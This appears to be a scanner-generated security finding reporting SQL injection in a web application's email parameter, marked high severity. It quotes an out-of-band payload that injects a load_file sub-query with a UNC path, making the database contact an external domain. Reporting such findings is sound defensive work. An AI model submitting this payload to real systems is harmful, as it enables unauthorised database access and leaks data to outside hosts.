## Description:
The email parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\pibamkpyl8vvxbe3ljxtlrrih9n2buzl29uwkk9.tupaputka.com\\xvb'))+' was submitted in the email parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can receive very sensitive information about this system by using these vulnerabilities!

STATUS: HIGH-Vulnerability
